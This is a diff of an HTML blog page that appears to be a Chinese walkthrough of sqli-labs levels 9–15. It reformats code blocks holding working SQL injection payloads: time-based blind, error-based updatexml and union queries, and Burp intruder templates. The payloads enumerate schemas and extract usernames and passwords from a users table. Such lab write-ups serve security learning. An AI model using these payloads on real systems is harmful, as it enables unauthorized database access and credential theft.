+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/114902251-37723e80-9e48-11eb-928a-e3eb069b74a2.png" alt="image"></p>
 <p>之后在尝试找到8，利用bp也可以爆破</p>
 <p>之后再构造left语句，查询每一位</p>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(left(database(),8)-'</span>ssss'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(left(database(),8)-'</span>ssss'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>只要时间够，利用bp是完全可以爆下来的</p>
 <ul>
 <li>查表</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(left((select table_name from information_schema.tables where table_schame='</span>sequrity<span class="token string">' limit 1,1),1)='</span>s'<span class="token punctuation">,</span> sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(left((select table_name from information_schema.tables where table_schame='</span>sequrity<span class="token string">' limit 1,1),1)='</span>s'<span class="token punctuation">,</span> sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <ul>
 <li>查列</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(left((select column_name from information_schema.columns where table_naem='</span>users<span class="token string">' limit 1,1),1)='</span><span class="token number">a</span>'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(left((select column_name from information_schema.columns where table_naem='</span>users<span class="token string">' limit 1,1),1)='</span>a<span class="token string">',sleep(3),1) --+
 
-?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(left((select column_name from information_schema.columns where table_name='</span>users<span class="token string">' limit 4,1),8)='</span>password'<span class="token punctuation">,</span> sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+//最终结果</span>
-</code></pre>
+?id=1'</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token keyword">limit</span> <span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'password'</span><span class="token punctuation">,</span> sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+//最终结果</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <ul>
 <li>查字段</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(left((select password from security.users limit 1,1),1)='</span>p'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(left((select password from security.users limit 1,1),1)='</span>p<span class="token string">',sleep(3),1) --+
 
-?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(left((select password from users order by id limit 0,1),4)='</span>dumb' <span class="token punctuation">,</span> sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+//最后结果</span>
-</code></pre>
+?id=1'</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> password <span class="token keyword">from</span> users <span class="token keyword">order</span> <span class="token keyword">by</span> id <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'dumb'</span> <span class="token punctuation">,</span> sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+//最后结果</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>由于每次都要手动换好几个数，可以利用sqlmap。。</p>
 <h2 id="10-和9题类似，只有-单双引号的区别，不再赘述。。。"><a href="#10-和9题类似，只有-单双引号的区别，不再赘述。。。" class="headerlink" title="10. 和9题类似，只有 单双引号的区别，不再赘述。。。"></a>10. 和9题类似，只有 单双引号的区别，不再赘述。。。</h2><p><img src="https://user-images.githubusercontent.com/76896357/114960633-07ec2200-9e9a-11eb-8e7a-82cdf6ab5b48.png" alt="image"></p>
 <p>只有这种情况下睡眠3秒，因此猜测闭合方式是“。。</p>
@@ -768,35 +733,28 @@ __完了，没有回显了，那么我们就想到报错注入__
 <p><img src="https://user-images.githubusercontent.com/76896357/114962318-0f60fa80-9e9d-11eb-92d2-b93a8ff6982b.png" alt="image"></p>
 <p>这里之前输入了好多种情况，只有‘才会报错，那么估计闭合方式是‘，再看一下有没有回显</p>
 <ul>
-<li>查看回显<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment" spellcheck="true">#&amp;passwd=admin&amp;submit=Submit</span>
-</code></pre>
-</li>
+<li>查看回显<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment">#&amp;passwd=admin&amp;submit=Submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/114963421-4c2df100-9e9f-11eb-9889-9096449b170b.png"></p>
 <p>本来之前以为和前十一样，没想到。。。只有两列</p>
 <p><strong>说明有回显</strong></p>
 <ul>
 <li><p>查库</p>
-<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment" spellcheck="true">#&amp;passwd=admin&amp;submit=Submit</span>
-</code></pre>
-</li>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment">#&amp;passwd=admin&amp;submit=Submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li><p>查表</p>
-<pre><code>uname=-admin&#39; union select 1,table_name from information_shema.tabes where table_schema=security #&amp;passwd=admin&amp;submit=Submit
-</code></pre>
-</li>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;-admin&#39; union select 1,table_name from information_shema.tabes where table_schema&#x3D;security #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/114963822-26edb280-9ea0-11eb-9610-79564eb378f4.png" alt="image"></p>
 <ul>
 <li><p>查列</p>
-<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin<span class="token string">' union select database(),group_concat(column_name) from information_schema.columns where table_name='</span>users'<span class="token comment" spellcheck="true">#&amp;passwd=admin&amp;submit=Submit</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin<span class="token string">' union select database(),group_concat(column_name) from information_schema.columns where table_name='</span>users'<span class="token comment">#&amp;passwd=admin&amp;submit=Submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/114964056-8c41a380-9ea0-11eb-8bdc-799356b8bdd6.png" alt="image"></p>
 </li>
 <li><p>查字段</p>
 </li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> security<span class="token punctuation">.</span>users <span class="token comment" spellcheck="true">#&amp;passwd=admin&amp;submit=Submit</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> security<span class="token punctuation">.</span>users <span class="token comment">#&amp;passwd=admin&amp;submit=Submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/114964198-d2970280-9ea0-11eb-8470-743c67459ece.png" alt="image"></p>
 <p>过了</p>
 <h2 id="12-POST双引号注入"><a href="#12-POST双引号注入" class="headerlink" title="12. POST双引号注入"></a>12. POST双引号注入</h2><p>根据之前的经验直接进行抓包</p>
@@ -819,50 +777,42 @@ __完了，没有回显了，那么我们就想到报错注入__
 <ul>
 <li>查库</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin"<span class="token punctuation">)</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#&amp;passwd=1&amp;submit=Submi</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin"<span class="token punctuation">)</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#&amp;passwd=1&amp;submit=Submi</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/114965654-96b16c80-9ea3-11eb-9b54-fef2caf8a761.png" alt="image"></p>
 <ul>
-<li>查询所有库<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin"<span class="token punctuation">)</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#&amp;passwd=1&amp;submit=Submi</span>
-</code></pre>
-</li>
+<li>查询所有库<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin"<span class="token punctuation">)</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#&amp;passwd=1&amp;submit=Submi</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/114965789-e3954300-9ea3-11eb-8a88-e79a408c4b9a.png"></p>
 <ul>
 <li><p>查表</p>
-<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin"<span class="token punctuation">)</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#&amp;passwd=1&amp;submit=Submi</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin"<span class="token punctuation">)</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#&amp;passwd=1&amp;submit=Submi</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/114965919-28b97500-9ea4-11eb-933a-a52000908768.png" alt="image"></p>
 </li>
 <li><p>查列</p>
 </li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin"<span class="token punctuation">)</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#&amp;passwd=1&amp;submit=Submi</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin"<span class="token punctuation">)</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#&amp;passwd=1&amp;submit=Submi</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/114966102-7d5cf000-9ea4-11eb-9655-261e870b9bd9.png" alt="image"></p>
 <p>注意这里没有全部显示出来，那么就用limit</p>
-<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin"<span class="token punctuation">)</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token keyword">limit</span> <span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#&amp;passwd=1&amp;submit=Submi</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin"<span class="token punctuation">)</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token keyword">limit</span> <span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#&amp;passwd=1&amp;submit=Submi</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>因此，在这里发生了一点小插曲</p>
 <p><img src="https://user-images.githubusercontent.com/76896357/114966500-40ddc400-9ea5-11eb-89c7-fadfd419038a.png" alt="image"></p>
 <ul>
 <li>查字段</li>
 </ul>
-<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin"<span class="token punctuation">)</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> security<span class="token punctuation">.</span>users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#&amp;passwd=1&amp;submit=Submi</span>
-</code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token operator">-</span>admin"<span class="token punctuation">)</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> security<span class="token punctuation">.</span>users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#&amp;passwd=1&amp;submit=Submi</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>这里仍然是查询不完整，再用上面的方法就好了</p>
 <p>这一关也过了。。。</p>
 <h2 id="13-单引号变形报错注入"><a href="#13-单引号变形报错注入" class="headerlink" title="13. 单引号变形报错注入"></a>13. 单引号变形报错注入</h2><ul>
 <li><p>代理抓包，送到repeater模块</p>
 </li>
 <li><p>看一下闭合方式</p>
-<pre><code>admin&#39;//能看处什么方式闭合就行
-</code></pre>
-</li>
+<pre class="line-numbers language-none"><code class="language-none">admin&#39;&#x2F;&#x2F;能看处什么方式闭合就行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
 <ul>
-<li>根据报错，试一下报错注入<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token string">') and updatexml(1,concat('</span><span class="token operator">^</span><span class="token string">',(select database()),'</span><span class="token operator">^</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#&amp;passwd=&amp;submit=Submit</span>
-</code></pre>
+<li>根据报错，试一下报错注入<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token string">') and updatexml(1,concat('</span><span class="token operator">^</span><span class="token string">',(select database()),'</span><span class="token operator">^</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#&amp;passwd=&amp;submit=Submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <img src="https://user-images.githubusercontent.com/76896357/114978311-a5a41900-9ebb-11eb-9725-1f42c9b2b6e6.png" alt="image"></li>
 </ul>
 <p>注入成功</p>
@@ -872,8 +822,7 @@ __完了，没有回显了，那么我们就想到报错注入__
 <p><img src="https://user-images.githubusercontent.com/76896357/114978625-0895b000-9ebc-11eb-87df-d60fee8e19b7.png" alt="image"></p>
 <p>很显然不能，那么，就直接用报错注入就好，和12题类似</p>
 <h2 id="14-POST型bool盲注"><a href="#14-POST型bool盲注" class="headerlink" title="14. POST型bool盲注"></a>14. POST型bool盲注</h2><ul>
-<li>猜测闭合方式<pre class=" language-sql"><code class="language-sql">admin" <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment" spellcheck="true">#</span>
-</code></pre>
+<li>猜测闭合方式<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">admin" <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <img src="https://user-images.githubusercontent.com/76896357/114979112-e3ee0800-9ebc-11eb-9b43-ecf0062f29a0.png" alt="image"></li>
 </ul>
 <p>从这里可以知道“为闭合方式</p>
@@ -886,8 +835,8 @@ __完了，没有回显了，那么我们就想到报错注入__
 <p><img src="https://user-images.githubusercontent.com/76896357/114979462-7b535b00-9ebd-11eb-8675-4a8208c6fdec.png" alt="image"></p>
 <p>在这里，进行延时注入的时候发现他报错，有可能存在报错注入</p>
 <p>延时注入可以爆破，</p>
-<pre><code>uname=admin&quot; and updatexml(1,concat(&#39;^&#39;,(select database()),&#39;^&#39;),1) #&amp;passwd=&amp;submit=Submit 
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&quot; and updatexml(1,concat(&#39;^&#39;,(select database()),&#39;^&#39;),1) #&amp;passwd&#x3D;&amp;submit&#x3D;Submit <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/114980178-ab4f2e00-9ebe-11eb-9cab-b77cb85d3992.png" alt="image"></p>
 <p>报错注入也可以</p>
 <p>下面的就是换语句进行报错注入了，这一关，就先过了</p>
@@ -904,20 +853,17 @@ __完了，没有回显了，那么我们就想到报错注入__
 <ul>
 <li>查库</li>
 </ul>
-<pre><code>uname=admin&#39; and if(substr(database(),§1§,1)=&#39;§s§&#39;,sleep(5),1)#&amp;passwd=&amp;submit=Submit//使用substr函数，利用bp爆破
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39; and if(substr(database(),§1§,1)&#x3D;&#39;§s§&#39;,sleep(5),1)#&amp;passwd&#x3D;&amp;submit&#x3D;Submit&#x2F;&#x2F;使用substr函数，利用bp爆破<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/114982063-8ad4a300-9ec1-11eb-8be4-ec232ce7a37c.png" alt="image"></p>
 <ul>
-<li>查表<pre><code>uname=admin&#39; and if(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1),§1§,1)=&#39;§s§&#39;,sleep(5),1)#&amp;passwd=&amp;submit=Submit//这里我用的bp爆破，标记点也已经给出，但是只能爆出第一个，需要我们手动改一下limit，后面的那个值
-</code></pre>
-</li>
+<li>查表<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39; and if(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1,1),§1§,1)&#x3D;&#39;§s§&#39;,sleep(5),1)#&amp;passwd&#x3D;&amp;submit&#x3D;Submit&#x2F;&#x2F;这里我用的bp爆破，标记点也已经给出，但是只能爆出第一个，需要我们手动改一下limit，后面的那个值<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
 <p><img src="https://user-images.githubusercontent.com/76896357/114982545-2ebe4e80-9ec2-11eb-89c4-9d9233c74629.png" alt="image"></p>
 <p>下面这个就查到了user表！！！</p>
 <p><img src="https://user-images.githubusercontent.com/76896357/114982884-8f4d8b80-9ec2-11eb-8f41-c2d52500db0f.png" alt="image"></p>
 <ul>
-<li>查列<pre class=" language-sql"><code class="language-sql">uname<span class="token operator">=</span>admin<span class="token string">' and if(substr((select column_name from information_schema.columns where table_name='</span>users<span class="token string">' limit 3,1),§1§,1)='</span>§s§'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#&amp;passwd=&amp;submit=Submit</span>
-</code></pre>
